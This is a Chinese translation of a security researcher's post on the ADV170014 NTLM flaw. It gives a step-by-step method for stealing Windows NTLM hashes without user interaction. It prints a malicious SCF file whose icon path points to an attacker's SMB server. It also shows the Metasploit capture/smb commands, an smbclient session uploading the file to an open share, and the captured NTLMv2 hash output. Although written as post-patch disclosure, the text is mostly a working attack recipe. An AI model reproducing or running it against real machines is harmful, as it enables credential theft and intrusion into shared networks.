# 【技术分享】ADV170014 NTLM SSO：利用指南
|
##### 译文声明
本文是翻译文章，文章来源：sysadminjd.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[兴趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**  
**
**一、前言**
2017年10月，微软在周二补丁日公布了一份安全公告（ **ADV170014** ），这份安全公告中提到了 **NTLM**
身份验证方案中的一个漏洞，恶意攻击者可以利用这个漏洞来窃取哈希，远程冻结受影响的主机。
我在2017年5月24日报告了这个漏洞，微软于2017年10月18日正式结束了该漏洞处理周期。
因此，微软总共花了148天来检查这个问题。
在10月份的周二补丁日之后，我公开了漏洞的详细信息，既然官方已经公布这个漏洞的“解决方案”，现在系统管理员可以在注册表上使用补丁来修复漏洞（前提当前环境可以使用这个补丁），后面我们会详细介绍这一点。
**二、漏洞概要**
众所周知，微软的NTLM架构中存在一些缺陷，哈希窃取并不是一门新的技术，渗透测试人员在攻击微软环境时，首先就会尝试哈希窃取技术。
然而，这些技术大多数都需要用户参与其中，或者需要拦截流量才能完成攻击流程。
本文介绍的这种新的攻击方法完全不需要用户交互，所有操作都可以在攻击者这端完成，当然，为了成功实施攻击，必须满足某些条件。
**三、攻击场景**
若要实施攻击，目标主机上必须存在没有设置密码保护的一个共享文件夹，这种场景非常常见，比如办公室、学校、医院以及大多数Windows环境中，人们都会通过共享文件夹来共享音乐、照片以及文档。
举个例子，用户“Juan”在他的桌面上创建了一个文件夹，名为“Pruba2”，他想把这个文件夹共享给他的团队使用。
现在，转到“Sharing（共享）”选项卡窗口，修改目录属性，允许用户不使用密码来查看这个共享文件夹。
在这个对话框中，我们可以看到共享文件夹的具体路径，为“\JUAN-PCUsersjuanDesktopprueba2”。
现在，点击“Network and Sharing center（网络和共享中心）”。
如上图所示，点击“Turn off password protected
sharing（关闭密码保护共享）”选项，这样一来，任何用户就可以访问这个共享文件夹，无需身份验证。
**四、SCF文件**
微软在Windows 3.11时引入了 **SCF** 文件。SCF文件其实是纯文本文件，可以用来指导Windows文件资源管理器执行一些基本任务。
现在已经有一些基于SCF的攻击手段，但到目前为止，所有的这些攻击方法都需要用户参与才能执行SCF文件。
我们找到了近期使用的两个例子，来自Defense Code的Bosko Stankovic在一篇文章中介绍了如何使用Google
Chrome浏览器窃取Windows凭据信息，2015年的黑帽大会上，Jonathan Brossard以及Hormazd
Billimoria演示了使用SMB的一种攻击方法（请参考：“SMB:共享的不仅仅是你的文件”）。
基本的SCF文件结构如下所示：
    [Shell]
    Command=2
    IconFile=\192.168.1.101sharetest.ico
    [Taskbar]
    Command=ToggleDesktop
文件结构就是这么简单。值得一提的是，SCF文件表面上看起来比较简单，实际上这个Windows功能非常复杂，并且几乎不存在相关的参考文档。
**五、窃取哈希**
在攻击演示场景中，我们准备使用 **Metasploit** 工具，所使用的SCF文件内容如下所示：
    root@sysadminjd:~# cat test.scf
    [Shell]
    Command=2
    IconFile=\192.168.1.111sharetest.ico
    [Taskbar]
    Command=ToggleDesktop
    root@sysadminjd:~#
我们所使用的攻击主机IP地址为192.168.1.111，在攻击主机上，我们运行着capture/smb Metasploit模块：
    root@sysadminjd:~# msfconsole -q
    msf > use auxiliary/server/capture/smb
    msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhash.txt
    JOHNPWFILE = /tmp/smbhash.txt
    msf auxiliary(smb) > exploit -j
    [*] Auxiliary module running as background job
    [*] Server started.
    msf auxiliary(smb)
因为我们准备使用John the
Ripper来破解捕获的哈希，所以我们需要在上述命令中设置JOHNPWFILE选项，将其指向/tmp/smbhash.txt，该文件用来保存已捕捉到的哈希值。
此时，Prueba2目录中空空如也，想要攻击成功的话，我们需要往里面添点东西。
一切准备就绪后，我们需要将SCF文件上传到受漏洞影响的这个目录中，此时我们可以使用各种方法，比如通过OSX
Finder、Windows资源管理器来上传文件，这里我们使用的是smbclient这个命令行工具。
    root@sysadminjd:~# smbclient //192.168.1.67/Users
    WARNING: The "syslog" option is deprecated
    Enter root's password:
    OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
    smb: > cd juan
    smb: juan> cd Desktop
    smb: juanDesktop> cd prueba2
    smb: juanDesktopprueba2> put test.scf
    putting file test.scf as juanDesktopprueba2test.scf (88.9 kb/s) (average 88.9 kb/s)
    smb: juanDesktopprueba2> ls
    . D 0 Mon Oct 23 12:27:15 2017
    .. D 0 Mon Oct 23 12:27:15 2017
    .DS_Store AH 6148 Tue May 23 17:29:03 2017
    test.scf A 91 Mon Oct 23 12:27:15 2017
    6527487 blocks of size 4096. 4043523 blocks available
    smb: juanDesktopprueba2>
    root@sysadminjd:~#
随后，这个目录中出现了我们上传的SCF文件。
一切顺利的话，此时我们的Metasploit控制台中会出现如下信息：
    msf auxiliary(smb) >
    [*] SMB Captured - 2017-10-23 12:27:15 -0400
    NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
    USER:juan DOMAIN:juan-PC OS: LM:
    LMHASH:Disabled
    LM_CLIENT_CHALLENGE:Disabled
    NTHASH:47894338d99abe2f08e2c693618c7323
    NT_CLIENT_CHALLENGE:0101000000000000d0046aca1b4cd301d755c3756d5639d800000000020000000000000000000000
    [*] SMB Captured - 2017-10-23 12:27:15 -0400
    NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
    USER:juan DOMAIN:juan-PC OS: LM:
    LMHASH:Disabled